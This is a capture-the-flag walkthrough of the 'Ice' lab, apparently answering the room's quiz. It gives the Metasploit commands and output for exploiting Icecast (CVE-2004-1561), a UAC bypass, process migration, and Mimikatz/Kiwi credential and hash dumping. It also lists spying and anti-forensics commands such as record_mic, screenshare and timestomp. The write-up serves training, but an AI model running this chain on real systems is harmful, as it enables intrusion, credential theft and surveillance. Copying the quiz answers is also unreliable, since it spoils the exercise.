# Ice

## Task 2
### Recon

I recommend using a SYN scan set to scan all ports on the machine.

`sudo nmap -sS -sC -sV-p- -oN nmap/versions 10.10.69.136`


Remote Desktop Protocol Wiki

https://en.wikipedia.org/wiki/Remote_Desktop_Protocol

### #3 What port is this open on?
    3389

3389/tcp  open  ms-wbt-server

### #4 What service did nmap identify as running on port 8000? (First word of this service)

    icecast
8000/tcp  open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).

### #5 What does Nmap identify as the hostname of the machine? (All caps for the answer)
    DARK-PC
 

Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows


## Task 3
## Gain Access

### #1 What type of vulnerability is it?
    
    execute code overflow

https://www.cvedetails.com/vulnerability-list/vendor_id-693/Icecast.html

### #2 What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
    
    CVE-2004-1561 

https://www.cvedetails.com/cve/CVE-2004-1561/


`msfconsole`

`search icecast`

### #3 What is the full path (starting with exploit) for the exploitation module?
    
    exploit/windows/http/icecast_header

`use 0`

`show options`

### #4 What is the only required setting which currently is blank?
    
    rhosts

`set RHOSTS 10.10.69.136`

`exploit`

`meterpreter > getwd`
`C:\Program Files (x86)\Icecast2 Win32`


## Task 4
## Escalate

### #1 Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
    
    meterpreter


### #2 	What user was running that Icecast process?
    dark

`getuid`
    
    Server username: Dark-PC\Dark

### #3 What build of Windows is the system?

    7601

`sysinfo`
    
    Computer        : DARK-PC
    OS              : Windows 7 (Build 7601, Service Pack 1).
    Architecture    : x64


### #4  hat is the architecture of the process we're running?
    
    x64

`run post/multi/recon/local_exploit_suggester`


### #6 hat is the full path (starting with exploit/) for the first returned exploit?
    
    exploit/windows/local/bypassuac_eventvwr

`ctrl + z` to background

`use exploit/windows/local/bypassuac_eventvwr`

`show options`

`set SESSION 1`


### #10 further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
    LHOST

`set LHOST 10.9.107.197`

`run`

`getprivs`

### #14 What permission listed allows us to take ownership of files?

    SeTakeOwnershipPrivilege

SeSystemtimePrivilege

SeTakeOwnershipPrivilege

SeTimeZonePrivilege

SeUndockPrivilege

## Task 5 
## Looting

lsass - Local Security Authority Subsystem Service is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system

NT AUTHORITY\SYSTEM - used by os as a default user, this has the highest privilege 

### spoolsv.exe 

    The genuine spoolsv.exe file is a software component of Microsoft Windows Operating System by Microsoft.
    Spoolsv.exe is an executable file that runs the Print Spooler Service, a process that caches printing jobs into system memory as images as printers cannot understand fonts or decipher graphics.

### #2  What's the name of the printer service?
    spoolsv.exe

1136  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe

1260  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe

1320  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe


`migrate 1260`

`getuid`

Server username: NT AUTHORITY\SYSTEM

Mimikatz is a rather infamous password dumping tool

Kiwi is the updated version of Mimikatz

`load kiwi`

`help`

`creds_all`

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

### #8  What is Dark's password?
    
    Password01!

## Task 6
## Post- Exploitation

### #2 	What command allows us to dump all of the password hashes stored on the system?

    hashdump

Command       Description
-------       -----------
hashdump      Dumps the contents of the SAM database


### #3 what command allows us to watch the remote user's desktop in real time?
    
    screenshare

### #4 	How about if we wanted to record from a microphone attached to the system?

    record_mic

### #5 To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this?
    
    timpstomp

### #6 	 Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

    golden_ticket_create

`run post/windows/manage/enable_rdp`

